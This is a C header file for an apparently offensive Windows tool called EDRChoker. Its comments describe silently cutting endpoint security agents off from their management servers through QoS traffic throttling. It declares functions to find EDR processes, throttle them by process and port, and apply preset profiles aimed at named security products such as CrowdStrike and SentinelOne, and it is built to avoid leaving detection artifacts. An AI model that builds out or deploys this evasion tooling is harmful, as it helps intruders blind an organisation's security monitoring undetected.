#ifndef JOCKY_EDRHOKER_H
#define JOCKY_EDRHOKER_H

#include <windows.h>
#include <stdint.h>

/* EDRChoker: Driverless EDR Neutralization via QoS Throttling
 *
 * Starves EDR agents of network bandwidth instead of killing them.
 * Applies extreme throttling at the Windows QoS/traffic shaping layer
 * that EDR solutions rarely monitor, causing silent timeouts without
 * generating packet-drop or process-kill artifacts.
 *
 * Technique: June 2026 disclosure
 * Platform: Windows x64
 * Effort: 2 days
 *
 * The EDR agent remains healthy and running, but its connection to
 * the management server is severed via network stack throttling at
 * the QoS layer (below most EDR visibility).
 */

/* EDR process detection and targeting */

typedef struct {
    uint32_t pid;
    WCHAR process_name[256];
    uint32_t port;
} EDR_PROCESS_INFO;

typedef struct {
    char* names[32];        /* EDR process names to target */
    int count;
    uint32_t throttle_kbps; /* Throttle rate in KB/s */
} EDR_PROFILE;

/* Detect common EDR agents on the system */
int jocky_edrhoker_detect_edr_processes(
    EDR_PROCESS_INFO* out_processes,
    int max_count,
    int* out_found);

/* Apply QoS throttling to a specific process */
int jocky_edrhoker_throttle_process(
    uint32_t pid,
    uint32_t throttle_kbps);

/* Apply QoS throttling to a specific process + port combination */
int jocky_edrhoker_throttle_process_port(
    uint32_t pid,
    uint16_t port,
    uint32_t throttle_kbps);

/* Detect EDR profile and apply appropriate throttling */
int jocky_edrhoker_apply_profile(const EDR_PROFILE* profile);

/* Preset profiles for common EDR solutions */
int jocky_edrhoker_profile_crowdstrike(void);
int jocky_edrhoker_profile_sentinelone(void);
int jocky_edrhoker_profile_carbonblack(void);
int jocky_edrhoker_profile_mbeddr(void);
int jocky_edrhoker_profile_cortex(void);

/* Auto-detect and throttle all known EDR agents */
int jocky_edrhoker_auto_throttle(uint32_t throttle_kbps);

/* Remove QoS throttling rules */
int jocky_edrhoker_remove_throttle(uint32_t pid);
int jocky_edrhoker_remove_all_throttles(void);

#endif /* JOCKY_EDRHOKER_H */
